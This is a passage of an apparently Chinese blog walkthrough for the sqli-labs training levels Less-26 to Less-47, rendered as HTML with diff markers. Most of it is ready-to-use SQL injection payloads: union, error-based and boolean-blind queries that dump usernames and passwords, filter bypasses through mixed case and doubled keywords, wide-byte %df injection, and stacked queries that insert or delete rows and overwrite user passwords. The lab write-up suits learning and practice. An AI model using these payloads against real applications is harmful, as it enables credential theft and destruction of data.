select 2,3,group_concat(schema_name) from infoorrmation_schema.schemata -- -</span><br><span class="line">?id=0 union select 2,3,group_concat(schema_name) from infoorrmation_schema.schemata -- -</span><br><span class="line"></span><br><span class="line"># 查询指定数据库security中的所有表名</span><br><span class="line">?id=0&#x27; union select 2,3,group_concat(table_name) from infoorrmation_schema.tables where table_schema=&#x27;security&#x27; -- -</span><br><span class="line">?id=0 union select 2,3,group_concat(table_name) from infoorrmation_schema.tables where table_schema=&#x27;security&#x27; -- -</span><br><span class="line"></span><br><span class="line"># 查询指定数据库security中的指定数据表users的所有列名</span><br><span class="line">?id=0&#x27; union select 2,3,group_concat(column_name) from infoorrmation_schema.columns where table_schema=&#x27;security&#x27; aandnd table_name=&#x27;users&#x27; -- -</span><br><span class="line">?id=0 union select 2,3,group_concat(column_name) from infoorrmation_schema.columns where table_schema=&#x27;security&#x27; aandnd table_name=&#x27;users&#x27; -- -</span><br><span class="line"></span><br><span class="line"># 查询指定数据库security中的指定数据表users的所有数据</span><br><span class="line">?id=0&#x27; union select 2,3,group_concat(id,&#x27;~&#x27;,username,0x7e,passwoorrd) from security.users -- -</span><br><span class="line">?id=0 union select 2,3,group_concat(id,&#x27;~&#x27;,username,0x7e,passwoorrd) from security.users -- -</span><br></pre></td></tr></table></figure>
+
+<h4 id="Less-26、Less-26a、Less-27、Less-27a、Less-28、Less-28a"><a href="#Less-26、Less-26a、Less-27、Less-27a、Less-28、Less-28a" class="headerlink" title="Less-26、Less-26a、Less-27、Less-27a、Less-28、Less-28a"></a>Less-26、Less-26a、Less-27、Less-27a、Less-28、Less-28a</h4><p>使用的是 <strong>GET</strong> 请求，格式如下：<code>?id=1</code></p>
+<p>Less-26 和 Less-26a 的后台对传输过去的<strong>id值</strong>进行处理，包含 <code>&#39;or&#39;</code> 、 <code>&#39;OR&#39;</code> 、 <code>&#39;and&#39;</code> 、 <code>&#39;AND&#39;</code> 、 <code>/**/</code> 、 <code>#</code> 、 <code>空格</code> 、<code>换行</code> 的会被替换掉。 </p>
+<p>Less-27 和 Less-27a 的后台对传输过去的<strong>id值</strong>进行处理，包含 <code>&#39;or&#39;</code> 、 <code>&#39;OR&#39;</code> 、 <code>&#39;and&#39;</code> 、 <code>&#39;AND&#39;</code> 、 <code>/**/</code> 、 <code>#</code> 、 <code>空格</code> 、<code>换行</code> 、 <code>+</code> 、 <code>union</code> 、<code>select</code> 、 <code>Union</code> 、<code>Select</code> 、 <code>UNION</code> 、<code>SELECT</code> 的会被替换掉。 但是可以部分大写部分小写来跳过</p>
+<p>Less-28 和 Less-28a 的后台和Less-27 和 Less-27a 的后台差不多。</p>
+<p>存在id为1的记录，会显示用户名和密码，否则无显示</p>
+<p>使用<code>union</code>的话好像一定会用到空格，所以行不通，得用用不到空格的注入语句，比如报错注入函数、盲注函数。</p>
+<p>与和或的字母形式被注释掉了，可以用它的字符形式，比如 <code>&amp;&amp;</code> 、<code>||</code> 。</p>
+<p>Less-26 会把sql的报错显示到前端来，所以可以使用 <strong>报错注入</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># 当前数据库名</span><br><span class="line">?id=0&#x27;||extractvalue(1,concat(0x24,database(),0x3f))||&#x27;1&#x27;=&#x27;1</span><br><span class="line"></span><br><span class="line"># 查询所有的数据库名</span><br><span class="line">?id=0&#x27;||updatexml(1,concat(0x24,(select(group_concat(schema_name))from(infoorrmation_schema.schemata)),0x3f),1)||&#x27;1&#x27;=&#x27;1</span><br><span class="line"># 长度受限</span><br><span class="line"></span><br><span class="line"># 查询指定数据库security中的所有表名</span><br><span class="line">?id=0&#x27;||extractvalue(1,concat(0x24,(select(group_concat(table_name))from(infoorrmation_schema.tables )where(table_schema=&#x27;security&#x27;)),0x3f))||&#x27;1&#x27;=&#x27;1</span><br><span class="line"># 长度受限</span><br><span class="line"></span><br><span class="line"># 查询指定数据库security中的指定数据表users的所有列名</span><br><span class="line">?id=0&#x27;||updatexml(1,concat(0x24,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_schema=&#x27;security&#x27;)anandd(table_name=&#x27;users&#x27;)),0x3f),1)||&#x27;1&#x27;=&#x27;1</span><br><span class="line"></span><br><span class="line"># 查询指定数据库security中的指定数据表users的所有数据</span><br><span class="line">?id=0&#x27;||extractvalue(1,concat(0x24,(select(group_concat(id,&#x27;~&#x27;,username,0x7e,passwoorrd))from(security.users)),0x3f))||&#x27;1&#x27;=&#x27;1</span><br><span class="line"># 长度受限</span><br></pre></td></tr></table></figure>
+
+<p>Less-26a 不会把sql的报错显示到前端来，所以可以使用 <strong>布尔盲注</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 当前数据库名</span><br><span class="line">?id=0&#x27;)||ascii(substr(database(),1,1))=115||(&#x27;0</span><br><span class="line"></span><br><span class="line"># 查询所有的数据库名</span><br><span class="line">?id=0&#x27;)||ascii(substr((select(group_concat(schema_name))from(infoorrmation_schema.schemata)),1,1))=105||(&#x27;0</span><br><span class="line"></span><br><span class="line"># 查询指定数据库security中的所有表名</span><br><span class="line">?id=0&#x27;)||ascii(substr((select(group_concat(table_name))from(infoorrmation_schema.tables )where(table_schema=&#x27;security&#x27;)),1,1))=101||(&#x27;0</span><br><span class="line"></span><br><span class="line"># 查询指定数据库security中的users表的所有列名</span><br><span class="line">?id=0&#x27;)||ascii(substr((select(group_concat(column_name))from(infoorrmation_schema.columns )where(table_schema=&#x27;security&#x27;)anandd(table_name=&#x27;users&#x27;)),1,1))=105||(&#x27;0</span><br><span class="line"></span><br><span class="line"># 查询指定数据库security中的users表的所有数据</span><br><span class="line">?id=0&#x27;)||ascii(substr((select(group_concat(id,&#x27;~&#x27;,username,0x7e,passwoorrd))from(security.users)),1,1))=49||(&#x27;0</span><br></pre></td></tr></table></figure>
+
+<p>Less-27 会把sql的报错显示到前端来，所以可以使用 <strong>报错注入</strong> 。可以使用部分大写部分小写来绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># 当前数据库名</span><br><span class="line">?id=0&#x27;||extractvalue(1,concat(0x24,database(),0x3f))||&#x27;1&#x27;=&#x27;1</span><br><span class="line"></span><br><span class="line"># 查询所有的数据库名</span><br><span class="line">?id=0&#x27;||updatexml(1,concat(0x24,(seLECt(group_concat(schema_name))from(information_schema.schemata)),0x3f),1)||&#x27;1&#x27;=&#x27;1</span><br><span class="line"># 长度受限</span><br><span class="line"></span><br><span class="line"># 查询指定数据库security中的所有表名</span><br><span class="line">?id=0&#x27;||extractvalue(1,concat(0x24,(seLECt(group_concat(table_name))from(information_schema.tables )where(table_schema=&#x27;security&#x27;)),0x3f))||&#x27;1&#x27;=&#x27;1</span><br><span class="line"># 长度受限</span><br><span class="line"></span><br><span class="line"># 查询指定数据库security中的指定数据表users的所有列名</span><br><span class="line">?id=0&#x27;||updatexml(1,concat(0x24,(seLECt(group_concat(column_name))from(information_schema.columns)where(table_schema=&#x27;security&#x27;)and(table_name=&#x27;users&#x27;)),0x3f),1)||&#x27;1&#x27;=&#x27;1</span><br><span class="line"></span><br><span class="line"># 查询指定数据库security中的指定数据表users的所有数据</span><br><span class="line">?id=0&#x27;||extractvalue(1,concat(0x24,(seLECt(group_concat(id,&#x27;~&#x27;,username,0x7e,password))from(security.users)),0x3f))||&#x27;1&#x27;=&#x27;1</span><br><span class="line"># 长度受限</span><br></pre></td></tr></table></figure>
+
+<p>Less-27a 不会把sql的报错显示到前端来，所以可以使用 <strong>布尔盲注</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 当前数据库名</span><br><span class="line">?id=0&quot;||ascii(substr(database(),1,1))=115||&quot;0</span><br><span class="line"></span><br><span class="line"># 查询所有的数据库名</span><br><span class="line">?id=0&quot;||ascii(substr((seLECt(group_concat(schema_name))from(information_schema.schemata)),1,1))=105||&quot;0</span><br><span class="line"></span><br><span class="line"># 查询指定数据库security中的所有表名</span><br><span class="line">?id=0&quot;||ascii(substr((seLECt(group_concat(table_name))from(information_schema.tables )where(table_schema=&#x27;security&#x27;)),1,1))=101||&quot;0</span><br><span class="line"></span><br><span class="line"># 查询指定数据库security中的users表的所有列名</span><br><span class="line">?id=0&quot;||ascii(substr((seLECt(group_concat(column_name))from(information_schema.columns )where(table_schema=&#x27;security&#x27;)and(table_name=&#x27;users&#x27;)),1,1))=105||&quot;0</span><br><span class="line"></span><br><span class="line"># 查询指定数据库security中的users表的所有数据</span><br><span class="line">?id=0&quot;||ascii(substr((seLECt(group_concat(id,&#x27;~&#x27;,username,0x7e,password))from(security.users)),1,1))=49||&quot;0</span><br></pre></td></tr></table></figure>
+
+<p>Less-28、Less-28a 不会把sql的报错显示到前端来，所以可以使用 <strong>布尔盲注</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 当前数据库名</span><br><span class="line">?id=0&#x27;)||ascii(substr(database(),1,1))=115||(&#x27;0</span><br><span class="line"></span><br><span class="line"># 查询所有的数据库名</span><br><span class="line">?id=0&#x27;)||ascii(substr((seLECt(group_concat(schema_name))from(information_schema.schemata)),1,1))=105||(&#x27;0</span><br><span class="line"></span><br><span class="line"># 查询指定数据库security中的所有表名</span><br><span class="line">?id=0&#x27;)||ascii(substr((seLECt(group_concat(table_name))from(information_schema.tables )where(table_schema=&#x27;security&#x27;)),1,1))=101||(&#x27;0</span><br><span class="line"></span><br><span class="line"># 查询指定数据库security中的users表的所有列名</span><br><span class="line">?id=0&#x27;)||ascii(substr((seLECt(group_concat(column_name))from(information_schema.columns )where(table_schema=&#x27;security&#x27;)and(table_name=&#x27;users&#x27;)),1,1))=105||(&#x27;0</span><br><span class="line"></span><br><span class="line"># 查询指定数据库security中的users表的所有数据</span><br><span class="line">?id=0&#x27;)||ascii(substr((seLECt(group_concat(id,&#x27;~&#x27;,username,0x7e,password))from(security.users)),1,1))=49||(&#x27;0</span><br></pre></td></tr></table></figure>
+
+<h4 id="Less-29、Less-30、Less-31"><a href="#Less-29、Less-30、Less-31" class="headerlink" title="Less-29、Less-30、Less-31"></a>Less-29、Less-30、Less-31</h4><p>参数污染好像是有两个相同的id，但是不同的值，进行传输。</p>
+<p>看不太懂，反正直接注就行</p>
+<p>使用的是 <strong>GET</strong> 请求，格式如下：<code>?id=1</code></p>
+<p>存在id为1的记录，会显示用户名和密码，否则无显示</p>
+<p>Less-29 闭合方式为 单引号</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 当前数据库名和用户名</span><br><span class="line">?id=0&#x27; union select 1,database(),user()-- -</span><br><span class="line"></span><br><span class="line"># 查询所有的数据库名</span><br><span class="line">?id=0&#x27; union select 2,3,group_concat(schema_name) from information_schema.schemata -- -</span><br><span class="line"></span><br><span class="line"># 查询指定数据库security中的所有表名</span><br><span class="line">?id=0&#x27; union select 2,3,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; -- -</span><br><span class="line"></span><br><span class="line"># 查询指定数据库security中的指定数据表users的所有列名</span><br><span class="line">?id=0&#x27; union select 2,3,group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; -- -</span><br><span class="line"></span><br><span class="line"># 查询指定数据库security中的指定数据表users的所有数据</span><br><span class="line">?id=0&#x27; union select 2,3,group_concat(id,&#x27;~&#x27;,username,0x7e,password) from security.users -- -</span><br></pre></td></tr></table></figure>
+
+<p>Less-30 闭合方式为 双引号</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 当前数据库名和用户名</span><br><span class="line">?id=0&quot; union select 1,database(),user()-- -</span><br><span class="line"></span><br><span class="line"># 查询所有的数据库名</span><br><span class="line">?id=0&quot; union select 2,3,group_concat(schema_name) from information_schema.schemata -- -</span><br><span class="line"></span><br><span class="line"># 查询指定数据库security中的所有表名</span><br><span class="line">?id=0&quot; union select 2,3,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; -- -</span><br><span class="line"></span><br><span class="line"># 查询指定数据库security中的指定数据表users的所有列名</span><br><span class="line">?id=0&quot; union select 2,3,group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; -- -</span><br><span class="line"></span><br><span class="line"># 查询指定数据库security中的指定数据表users的所有数据</span><br><span class="line">?id=0&quot; union select 2,3,group_concat(id,&#x27;~&#x27;,username,0x7e,password) from security.users -- -</span><br></pre></td></tr></table></figure>
+
+<p>Less-31 闭合方式为 双引号+括号</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 当前数据库名和用户名</span><br><span class="line">?id=0&quot;) union select 1,database(),user()-- -</span><br><span class="line"></span><br><span class="line"># 查询所有的数据库名</span><br><span class="line">?id=0&quot;) union select 2,3,group_concat(schema_name) from information_schema.schemata -- -</span><br><span class="line"></span><br><span class="line"># 查询指定数据库security中的所有表名</span><br><span class="line">?id=0&quot;) union select 2,3,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; -- -</span><br><span class="line"></span><br><span class="line"># 查询指定数据库security中的指定数据表users的所有列名</span><br><span class="line">?id=0&quot;) union select 2,3,group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; -- -</span><br><span class="line"></span><br><span class="line"># 查询指定数据库security中的指定数据表users的所有数据</span><br><span class="line">?id=0&quot;) union select 2,3,group_concat(id,&#x27;~&#x27;,username,0x7e,password) from security.users -- -</span><br></pre></td></tr></table></figure>
+
+<h4 id="Less-32、Less-33、Less-34（宽字节注入）"><a href="#Less-32、Less-33、Less-34（宽字节注入）" class="headerlink" title="Less-32、Less-33、Less-34（宽字节注入）"></a>Less-32、Less-33、Less-34（宽字节注入）</h4><p>前端用的是UTF-8，数据库用的是GBK。</p>
+<p>Less-32和Less-33 使用的是 <strong>GET</strong> 请求，格式如下：<code>?id=1</code> 。后台对传输过去的<strong>id值</strong>进行处理，包含 <strong>双引号</strong> 和 <strong>单引号</strong> 的会被转义掉 ，但是<code>#</code>和<code>-</code>没有被转义掉。 </p>
+<p>Less-34 使用的是 <strong>POST</strong> 请求。后台对传输过去的参数<strong>uname</strong>、<strong>passwd</strong>进行转义处理，包含 <strong>双引号</strong> 和 <strong>单引号</strong> 的会被转义，但是<code>#</code>和<code>-</code>没有被转义掉。</p>
+<p>存在id为1的记录，会显示用户名和密码，否则无显示</p>
+<p>Less-32和Less-33 可以进行宽字节注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 当前数据库名和用户名</span><br><span class="line">?id=0%df&#x27; union select 1,database(),user()-- -</span><br><span class="line"></span><br><span class="line"># 查询所有的数据库名</span><br><span class="line">?id=0%df&#x27; union select 2,3,group_concat(schema_name) from information_schema.schemata -- -</span><br><span class="line"></span><br><span class="line"># 查询指定数据库security中的所有表名</span><br><span class="line">?id=0%df&#x27; union select 2,3,group_concat(table_name) from information_schema.tables where table_schema=database() -- -</span><br><span class="line"></span><br><span class="line"># 查询指定数据库security中的指定数据表users的所有列名</span><br><span class="line">?id=0%df&#x27; union select 2,3,group_concat(column_name) from information_schema.columns where table_schema=0x7365637572697479 and table_name=0x7573657273 -- -</span><br><span class="line"></span><br><span class="line"># 查询指定数据库security中的指定数据表users的所有数据</span><br><span class="line">?id=0%df&#x27; union select 2,3,group_concat(id,0x24,username,0x7e,password) from security.users -- -</span><br></pre></td></tr></table></figure>
+
+<p>Less-34 可以进行宽字节注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">uname : 汉&#x27; union select 7,8 #</span><br><span class="line"></span><br><span class="line"># 当前数据库名和用户名</span><br><span class="line">uname : 汉&#x27; union select database(),user()-- -</span><br><span class="line"></span><br><span class="line"># 查询所有的数据库名</span><br><span class="line">uname : 汉&#x27; union select 3,group_concat(schema_name) from information_schema.schemata -- -</span><br><span class="line"></span><br><span class="line"># 查询指定数据库security中的所有表名</span><br><span class="line">uname : 汉&#x27; union select 3,group_concat(table_name) from information_schema.tables where table_schema=database() -- -</span><br><span class="line"></span><br><span class="line"># 查询指定数据库security中的指定数据表users的所有列名</span><br><span class="line">uname : 汉&#x27; union select 3,group_concat(column_name) from information_schema.columns where table_schema=0x7365637572697479 and table_name=0x7573657273 -- -</span><br><span class="line"></span><br><span class="line"># 查询指定数据库security中的指定数据表users的所有数据</span><br><span class="line">uname : 汉&#x27; union select 3,group_concat(id,0x24,username,0x7e,password) from security.users -- -</span><br></pre></td></tr></table></figure>
+
+<h4 id="Less-35、Less-36、Less-37"><a href="#Less-35、Less-36、Less-37" class="headerlink" title="Less-35、Less-36、Less-37"></a>Less-35、Less-36、Less-37</h4><p>Less-35和Less-36 使用的是 <strong>GET</strong> 请求，格式如下：<code>?id=1</code> 。后台对传输过去的<strong>id值</strong>进行处理，包含 <strong>双引号</strong> 和 <strong>单引号</strong> 的会被转义掉 ，但是<code>#</code>和<code>-</code>没有被转义掉。 </p>
+<p>可以使用16进制数来代替单双引号</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># 当前数据库名和用户名</span><br><span class="line">?id=0 union select 1,database(),user()-- -</span><br><span class="line">?id=%df&#x27; union select 1,database(),user()-- -</span><br><span class="line"></span><br><span class="line"># 查询所有的数据库名</span><br><span class="line">?id=0 union select 2,3,group_concat(schema_name) from information_schema.schemata -- -</span><br><span class="line">?id=%df&#x27; union select 2,3,group_concat(schema_name) from information_schema.schemata -- -</span><br><span class="line"></span><br><span class="line"># 查询指定数据库security中的所有表名</span><br><span class="line">?id=0 union select 2,3,group_concat(table_name) from information_schema.tables where table_schema=database() -- -</span><br><span class="line">?id=%df&#x27; union select 2,3,group_concat(table_name) from information_schema.tables where table_schema=database() -- -</span><br><span class="line"></span><br><span class="line"># 查询指定数据库security中的指定数据表users的所有列名</span><br><span class="line">?id=0 union select 2,3,group_concat(column_name) from information_schema.columns where table_schema=0x7365637572697479 and table_name=0x7573657273 -- -</span><br><span class="line">?id=%df&#x27; union select 2,3,group_concat(column_name) from information_schema.columns where table_schema=0x7365637572697479 and table_name=0x7573657273 -- -</span><br><span class="line"></span><br><span class="line"># 查询指定数据库security中的指定数据表users的所有数据</span><br><span class="line">?id=0 union select 2,3,group_concat(id,0x24,username,0x7e,password) from security.users -- -</span><br><span class="line">?id=%df&#x27; union select 2,3,group_concat(id,0x24,username,0x7e,password) from security.users -- -</span><br></pre></td></tr></table></figure>
+
+<p>Less-37 使用的是 <strong>POST</strong> 请求。后台对传输过去的<strong>id值</strong>进行处理，包含 <strong>双引号</strong> 和 <strong>单引号</strong> 的会被转义掉 ，但是<code>#</code>和<code>-</code>没有被转义掉。 </p>
+<p>可以使用16进制数来代替单双引号</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">uname: 汉&#x27; union select 7,8 #</span><br><span class="line"></span><br><span class="line"># 当前数据库名和用户名</span><br><span class="line">uname: 汉&#x27; union select database(),user()-- -</span><br><span class="line"></span><br><span class="line"># 查询所有的数据库名</span><br><span class="line">uname: 汉&#x27; union select 3,group_concat(schema_name) from information_schema.schemata -- -</span><br><span class="line"></span><br><span class="line"># 查询指定数据库security中的所有表名</span><br><span class="line">uname: 汉&#x27; union select 3,group_concat(table_name) from information_schema.tables where table_schema=database() -- -</span><br><span class="line"></span><br><span class="line"># 查询指定数据库security中的指定数据表users的所有列名</span><br><span class="line">uname: 汉&#x27; union select 3,group_concat(column_name) from information_schema.columns where table_schema=0x7365637572697479 and table_name=0x7573657273 -- -</span><br><span class="line"></span><br><span class="line"># 查询指定数据库security中的指定数据表users的所有数据</span><br><span class="line">uname: 汉&#x27; union select 3,group_concat(id,0x24,username,0x7e,password) from security.users -- -</span><br></pre></td></tr></table></figure>
+
+<h4 id="Less-38、Less-39、Less-40、Less-41（堆叠注入）"><a href="#Less-38、Less-39、Less-40、Less-41（堆叠注入）" class="headerlink" title="Less-38、Less-39、Less-40、Less-41（堆叠注入）"></a>Less-38、Less-39、Less-40、Less-41（堆叠注入）</h4><p><code>mysqli_multi_query()</code>这个函数可以实现针对数据库一条或多多条数据的操作，这就导致可能产生堆叠 注入的存在，堆叠注入的危害比普通爆破更为强烈,可以实现数据的增删改查，木马的写入，甚至直接破 环升格数据库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 例如插入一条数据在users字段中,两条不同sql语句用分号隔开</span><br><span class="line">?id=1&#x27;;insert into users(username,password)values(&#x27;ikun&#x27;,&#x27;jinitaimei&#x27;)--+</span><br><span class="line"># 例如利用堆叠注入删除上一关卡我们增添的数据</span><br><span class="line">?id=1;delete from users where username=&#x27;ikun&#x27;--+</span><br><span class="line"># 利用堆叠注入修改Dumb账户的密码</span><br><span class="line">?id=1&#x27;);update security.users set password=&#x27;IKUN&#x27; where username=&#x27;Dumb&#x27;--+</span><br><span class="line"># 利用堆叠注入修改Dumb账户的密码</span><br><span class="line">?id=1;update security.users set password=&#x27;IKUN&#x27; where username=&#x27;Dumb&#x27;--+</span><br></pre></td></tr></table></figure>
+
+<p>然后查看，以Less38为例</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 当前数据库名和用户名</span><br><span class="line">?id=0&#x27; union select 1,database(),user()-- -</span><br><span class="line"></span><br><span class="line"># 查询所有的数据库名</span><br><span class="line">?id=0&#x27; union select 2,3,group_concat(schema_name) from information_schema.schemata -- -</span><br><span class="line"></span><br><span class="line"># 查询指定数据库security中的所有表名</span><br><span class="line">?id=0&#x27; union select 2,3,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; -- -</span><br><span class="line"></span><br><span class="line"># 查询指定数据库security中的指定数据表users的所有列名</span><br><span class="line">?id=0&#x27; union select 2,3,group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; -- -</span><br><span class="line"></span><br><span class="line"># 查询指定数据库security中的指定数据表users的所有数据</span><br><span class="line">?id=0&#x27; union select 2,3,group_concat(id,&#x27;~&#x27;,username,0x7e,password) from security.users -- -</span><br></pre></td></tr></table></figure>
+
+<h4 id="Less-42、Less-43、Less-44、Less-45"><a href="#Less-42、Less-43、Less-44、Less-45" class="headerlink" title="Less-42、Less-43、Less-44、Less-45"></a>Less-42、Less-43、Less-44、Less-45</h4><p>使用的是 <strong>POST</strong> 请求。</p>
+<p>除了密码登陆处，其它的地方都进行了转义处理。</p>
+<p>密码登录处可以进行注入，也存在堆叠注入</p>
+<p>Less-42</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; or updatexml(1,concat(0x7e,database(),0x7e),1)#</span><br><span class="line">0&#x27; or 1=1;update users set password=&#x27;abc&#x27; #</span><br></pre></td></tr></table></figure>
+
+<p>Less-43</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;) or extractvalue(1,concat(0x7e,database(),0x7e))#</span><br><span class="line">0&#x27;) or 1=1;update users set password=&#x27;abc&#x27; #</span><br></pre></td></tr></table></figure>
+
+<p>Less-44 没有报错回显了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0&#x27; or 1=1;update users set password=&#x27;abc&#x27; #</span><br><span class="line">0&#x27; or ascii(substr(database(),1,1))=115 #</span><br></pre></td></tr></table></figure>
+
+<p>Less-45</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0&#x27;) or 1=1;update users set password=&#x27;123&#x27; #</span><br><span class="line">0&#x27;) or ascii(substr(database(),1,1))=115 #</span><br></pre></td></tr></table></figure>
+
+<h4 id="Less-46、Less-47"><a href="#Less-46、Less-47" class="headerlink" title="Less-46、Less-47"></a>Less-46、Less-47</h4><p>使用的是 <strong>GET</strong> 请求。</p>
+<p>除了密码登陆处，其它的地方都进行了转义处理。</p>
